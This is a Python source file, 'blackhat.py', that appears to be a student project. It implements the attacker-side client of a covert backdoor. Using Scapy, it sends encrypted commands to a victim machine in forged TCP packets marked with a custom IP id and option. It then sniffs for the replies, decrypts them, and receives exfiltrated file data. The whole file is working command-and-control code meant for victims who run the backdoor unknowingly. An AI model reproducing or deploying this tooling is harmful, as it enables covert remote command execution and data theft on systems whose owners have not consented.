# ###################################################################
# blackhat.py 
# 
#	This script is to sniff some information from backdoor server.
#	When a victim runs backdoor server unconsiously, the backdoor server
# 	notice to blackhat that the victim ran the backdoor server.
#	Once the blackhat knows that victim runs the backdoor server,
#	he or she can get some information by sending command to the server.
#	
#	The program is using Scapy python library that actually I can 
#	forge the packet whatevet I want
#	
# 	Theses are main functions:
#	- 0. wait until client runs backdoor program
#	- 1. get input (command to execute in the backdoor program)
#	- 2. encrypt the command data
#	- 3. send encrypted data to backdoor client
#	- 4. wait for the response from backdoor program
#	- 5. get the results
#	- 6. decrypt the results
# 	- 7. print the decrypted results
#	
#	Author:			Ben Kim
#
#	Date:			Oct 15 2015
#	
#	run:			python blackhat.py -d (destination IP address)
#					eg. python blackhat.py -d 192.168.0.17
#					
#	Further Improvements:
#	The script cannot handle a large amount of data in a packet.
#	Scapy sniffs wrong packet even I set the right rules sometimes.
#		
#
# ###################################################################
from scapy.all import *
from encrypt import *
import argparse
import sys
import socket
import fcntl
import struct
import time
import threading



NETCARD = 'en4'
KEY = "runningman"
src_ip = "192.168.1.5"	# by default
dst_ip = "192.168.1.9"	# by default


# ###################################################################
#	Function: get_ip_address
#	Input: 
#		- ifname : network interface name
#
#	Return:	local IP address
#	Description:	
#		- returns get the local IP address
#
# ###################################################################
def get_ip_address(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(
        s.fileno(),
        0x8915,  # SIOCGIFADDR
        struct.pack('256s', ifname[:15])
    )[20:24])


# ###################################################################
#	Function: client_ran_backdoor
#	Input: 
#		- pkt :	The packet that is informed by backdoor server that 
#				victim runs server
#
#	Return:	None
#	Description:
#		- notification that the victim runs backdoor server
#
# ###################################################################
def client_ran_backdoor(pkt):
	try:
		if pkt[IP].id == ord('K'):
			print "Backdoor executed."
		else:
			print "[ERROR] Sniffed wrong packet."
			exit(1)
	except OSError as e:
		print e


# ###################################################################
#	Function: get_input
#	Input: None
#
#	Return: Command Input
#	Description: 
#		- prompt for user to enter a message (command line)
#		- if a user put 'Q' or 'q', it terminates the program
#
# ###################################################################
def get_input():
	# get the command from a user
	print "Give me a command...to quit press 'Q' or 'q'"
	i = raw_input("# ")
	# if value is q or Q, quit the program
	if i == "q" or i == "Q":
		exit(1)
	return i



# ###################################################################
#	Function: stopfilter
#	Input: pkt that backdoor sniffs 
#
#	Return: 
#		- True : if the packet is containing the data that I want
#		- False : if the packet that is not relevant 
#	Description:	
#		- This function gets a packet from backdoor server.
#			and need to be validated if the packet is what I wanted to
#			sniff or not. Scapy sniffs by its filter but sometimes
#			it does not work, so I set my own rules.
#
# ###################################################################
def stopfilter(pkt):	
	global dst_ip

	if ARP in pkt:		# check if the packet has APR packet
		return False
	elif DHCP in pkt:	# check if the packet has DHCP packet
		return False
	elif UDP in pkt:	# check if the packet has UDP packet
		return False
	elif pkt[IP].options != None and pkt[IP].id == 7777:	# check option exists and packet IP id header
		if pkt[IP].src == dst_ip:	# check IP address if it is from victim machine
			if pkt[TCP].dport == 14156 :	# check TCP dst port
				try:
					# extract data from 'Raw' field
					enc_rst = pkt[Raw].load
					# decrypt the encrypted data
					rst = decrypt(enc_rst, KEY)
					print "##############################    RESULT    ######################################"
					print rst
					print "##################################################################################"
					return True
				except IndexError as e:		
					print "[Packet Skipped]"
					return False
	return False


def recv_file_filter(pkt):
	global dst_ip

	if ARP in pkt:		# check if the packet has APR packet
		return False
	elif DHCP in pkt:	# check if the packet has DHCP packet
		return False
	elif UDP in pkt:	# check if the packet has UDP packet
		return False
	elif pkt[IP].options != None and pkt[IP].id == 7777:	# check option exists and packet IP id header
		if pkt[IP].src == dst_ip:	# check IP address if it is from victim machine
			if pkt[TCP].dport == 14156 :	# check TCP dst port
				try:
					# extract data from 'Raw' field
					enc_rst = pkt[Raw].load
					# decrypt the encrypted data
					# rst = decrypt(enc_rst, KEY)
					print "##############################    RESULT    ######################################"
					print enc_rst
					print "##################################################################################"
					return True
				except IndexError as e:		
					print "[Packet Skipped]"
					return False
	return False

def recv_file():
	while(1):
		sniff(filter="src {} and tcp".format(dst_ip), count=1, stop_filter=recv_file_filter)	

# ###################################################################
#	Function: main
#	Input: None
#
#	Return: None
#	Description: 	
#		- first, it sniffs packet from backdoor server that it runs 
#			from victim machine. Then it loop through to get the input
#			(command) from the user. And the function will send and 
#			receive data. The data (command and result) will be encrypted
#
# ###################################################################
def main():
	global WAITING
	global KEY

	# wait for the signal that victim runs the backdoor server
	# print "Waiting for server to connect..."
	# sniff(filter="udp and dst port 80 and src port 123", prn=client_ran_backdoor, count=1)

	# start thread
	t = threading.Thread(name="watchfile_threading", target=recv_file)

	try:
		t.start()
	except (KeyboardInterrupt, SystemExit):
	    cleanup_stop_thread();
	    sys.exit()
	
	# while True:
	# 	cmd = get_input()
	# 	# encrypt command
	# 	enc_cmd = encrypt(cmd, KEY)
	# 	# send the length of input
	# 	send(IP(dst=dst_ip, id=7777, options=IPOption('\x83\x03\x10'))/(TCP(dport=14156))/Raw(load=enc_cmd))
	# 	# sniff packets from the backdoor server
	# 	sniff(filter="src {} and tcp".format(dst_ip), stop_filter=stopfilter)	


	t.join()

if __name__ == '__main__':
	try:
		# handling arguments
		parser = argparse.ArgumentParser("Backdoor Client")
		parser.add_argument("-d", "--dest_ip", help="Destination IP", action="store")
		args = parser.parse_args()

		# get the source ip address
		# src_ip = get_ip_address(NETCARD)
		# get the destination ip address from user specified
		# dst_ip = args.dest_ip
		print "Source IP:", src_ip
		print "Destination IP:", dst_ip

		main()
	except KeyboardInterrupt:
		print("Terminate signal received. Exiting...")